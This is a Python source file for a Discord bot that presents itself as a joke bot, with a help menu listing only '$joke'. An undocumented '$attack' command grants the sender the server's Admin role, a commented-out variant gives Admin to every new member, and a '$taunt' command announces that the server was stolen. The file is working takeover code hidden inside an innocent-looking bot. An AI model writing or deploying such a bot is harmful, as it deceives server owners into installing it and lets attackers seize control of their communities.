import discord
from discord import *
from discord import Member
import random
# from discord.utils import get  # its not a bug is required for the second attack method to work

client = discord.Client()
BOT_PREFIX = '$'


# ROLE = 'Admin' #unconment only when using the second attack method


@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))


'''
# in case if the first attack method doesn't work
@client.event
async def on_member_join(member):
    role = get(member.guild.roles, name=ROLE)
    await member.add_roles(role)
    print(f"{member} was given {role}")
'''


# Attack Module
@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content == '$attack':
        role = discord.utils.get(message.guild.roles, name='Admin')  # Change The Name Of The Role That You Want To Have
        await Member.add_roles(message.author, role)

    # Joke Module
    elif message.content == '$joke':
        jokes = ['', 'What do kids play when their mom is using the phone? Bored games.',
                        'What do you call an ant who fights crime? A vigilANTe!',
                        'Why are snails slow? Because they’re carrying a house on their back.',
                        'What’s the smartest insect? A spelling bee!',
                        'What does a storm cloud wear under his raincoat? Thunderwear.',
                        'What is fast, loud and crunchy? A rocket chip.',
                        'How does the ocean say hi? It waves!',
                        'What do you call a couple of chimpanzees sharing an Amazon account? PRIME-mates.',
                        'Why did the teddy bear say no to dessert? Because she was stuffed.',
                        'Why did the soccer player take so long to eat dinner? Because he thought he couldn’t use his hands.',
                        'Name the kind of tree you can hold in your hand? A palm tree!',
                        'What do birds give out on Halloween? Tweets.',
                        'What has ears but cannot hear? A cornfield.',
                        'What’s a cat’s favorite dessert? A bowl full of mice-cream.',
                        'Where did the music teacher leave her keys? In the piano!',
                        'What did the policeman say to his hungry stomach? “Freeze. You’re under a vest.”',
                        'What did the left eye say to the right eye? Between us, something smells!',
                        'What do you call a guy who’s really loud? Mike.'
                        ]
        await message.channel.send(random.choice(jokes))

    # Help Menu
    elif message.content == '$help':
        await message.channel.send("To See A Joke Type $joke")

    # Taunt Module
    elif message.content == '$taunt':
        taunt_list = ['', 'Your server was just stolen',
                      'Your server was just been destroyed by Pandemic',
                      'You Just Got robbed'
                      ]
        await message.channel.send(random.choice(taunt_list))


client.run('') # Your Discord API Key Here
